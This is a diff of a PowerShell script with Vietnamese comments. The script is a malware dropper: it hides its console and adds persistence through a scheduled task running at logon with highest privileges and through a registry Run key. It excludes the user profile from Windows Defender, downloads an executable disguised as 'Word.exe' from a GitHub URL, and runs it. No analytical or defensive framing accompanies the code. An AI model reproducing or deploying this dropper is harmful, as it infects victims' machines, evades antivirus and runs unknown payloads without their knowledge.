@@ -26,29 +26,40 @@ function Wait-ForInternet {
     }
 }
 
-function Add-ToStartup {
+function Add-ToTaskScheduler {
     $scriptPath = $MyInvocation.MyCommand.Definition
+    $taskName = "RunMyScript"
 
-    $startupFolder = [System.IO.Path]::Combine($env:AppData, "Microsoft\Windows\Start Menu\Programs\Startup")
+    schtasks.exe /create /tn $taskName /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" /sc onlogon /rl highest /f
+}
 
-    $WshShell = New-Object -ComObject WScript.Shell
-    $shortcut = $WshShell.CreateShortcut("$startupFolder\UnikeyNT.lnk")
-    $shortcut.TargetPath = "powershell.exe"
-    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-    $shortcut.Save()
+function Add-ToRegistry {
+    $scriptPath = $MyInvocation.MyCommand.Definition
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    Set-ItemProperty -Path $regPath -Name "RunMyScript" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
 }
 
 Hide-Console
-
-Add-ToStartup
+Add-ToTaskScheduler
+Add-ToRegistry
 
 Add-MpPreference -ExclusionPath $env:USERPROFILE
 
 $url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
 $outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')
 
-Wait-ForInternet
+# File để lưu trạng thái đã tải xuống
+$statusFile = [System.IO.Path]::Combine($env:Temp, 'downloaded.status')
 
-Invoke-WebRequest -Uri $url -OutFile $outputFile
+# Chỉ tải xuống tệp nếu nó chưa được tải
+if (-not (Test-Path $statusFile)) {
+    Wait-ForInternet
 
+    Invoke-WebRequest -Uri $url -OutFile $outputFile
+
+    # Tạo file trạng thái đã tải xuống
+    New-Item -Path $statusFile -ItemType File
+}
+
+# Khởi chạy tệp
 Start-Process -FilePath $outputFile
